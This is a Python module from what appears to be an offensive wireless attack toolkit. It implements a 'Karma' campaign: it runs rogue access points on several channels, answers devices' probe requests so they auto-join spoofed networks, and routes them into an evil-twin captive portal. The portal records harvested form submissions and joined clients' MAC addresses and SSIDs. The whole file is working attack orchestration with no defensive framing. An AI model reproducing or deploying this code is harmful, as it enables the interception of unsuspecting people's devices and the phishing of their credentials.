"""KarmaCampaign: drives one KarmaAP per operator-picked (interface, channel) pair -- one radio
per channel, since a client's directed probe only reaches Karma if it's on the channel Karma is
actually sitting on -- and (Linux, best effort) captive-portals whoever joins any of them, via one
shared KarmaBridge feeding EvilTwin's PortalStack. PortalStack only ever needed a bridge + an
SSID, never caring which attack (or how many radios) put a client on the TAP. No target
AccessPoint at all (launched from the Scanner, not a per-AP Focus panel) and no punting: Karma is
entirely passive, waiting for clients to volunteer themselves.
"""
from __future__ import annotations

import asyncio
import logging
import sys
import time
from typing import List, Optional, Tuple

from wifit3.campaigns.campaign import Campaign
from wifit3.campaigns.eviltwin.portal import PortalStack
from wifit3.campaigns.karma.bridge import KarmaBridge
from wifit3.campaigns.karma.karma_ap import KarmaAP
from wifit3.net.portal_templates import PortalTemplate

logger = logging.getLogger(__name__)

_POLL_SEC = 0.25
# No single SSID applies to every joiner (each client may believe it joined a different named
# network), so the portal page itself stays generic.
GENERIC_PORTAL_SSID = "Wi-Fi"


class KarmaCampaign(Campaign):
    button_id = None            # launched from the Scanner: no target AP, so no Focus button
    key = "karma"
    idle_label = "Karma"
    run_label = "Stop Karma"
    idle_variant = "primary"
    run_variant = "error"

    def __init__(self, array, hosts: List[Tuple[object, int]],
                 portal_template: PortalTemplate = PortalTemplate.CLICKTHROUGH):
        if not hosts:
            raise ValueError("KarmaCampaign needs at least one (interface, channel) pair")
        super().__init__(ap=None, array=array)
        self.hosts = list(hosts)                        # [(iface, channel), ...], operator-picked
        self.portal_template = portal_template
        self.karmas: List[KarmaAP] = []
        self.portal: Optional[PortalStack] = None
        self.ip_layer_error: Optional[str] = None
        self.portal_submissions: list[dict] = []       # harvested form submissions, newest last
        self.joined_clients: list[dict] = []            # {"mac", "ssid", "at"}, newest last

    async def _loop(self) -> None:
        self.karmas = [KarmaAP(iface, channel, rx_source=iface, on_client_joined=self._on_client_joined)
                       for iface, channel in self.hosts]
        for k in self.karmas:
            await k.start()
        await self._start_ip_layer()
        while not self.stopped:
            await asyncio.sleep(_POLL_SEC)

    def _on_client_joined(self, mac: str, ssid: str) -> None:
        self.joined_clients.append({"mac": mac, "ssid": ssid, "at": time.time()})

    async def _start_ip_layer(self) -> None:
        """Best-effort, same contract as ``EvilTwinCampaign._start_ip_layer``: Karma still leaks
        probed SSIDs and collects associations even if this fails."""
        if not sys.platform.startswith("linux"):
            self.ip_layer_error = "no IP layer yet on this platform (Linux only for now)"
            return
        bridge = KarmaBridge([(k.iface, k.bssid) for k in self.karmas])
        stack = PortalStack(bridge=bridge, ssid=GENERIC_PORTAL_SSID, template=self.portal_template,
                            on_submit=self.portal_submissions.append)
        try:
            await stack.start()
        except Exception as exc:                                    # noqa: BLE001
            logger.warning("karma: IP layer did not come up: %s", exc)
            self.ip_layer_error = str(exc)
            return
        self.portal = stack

    async def teardown(self) -> None:
        if not self.karmas:
            return
        try:
            for k in self.karmas:
                await k.stop()
        finally:
            if self.portal is not None:
                await self.portal.stop()
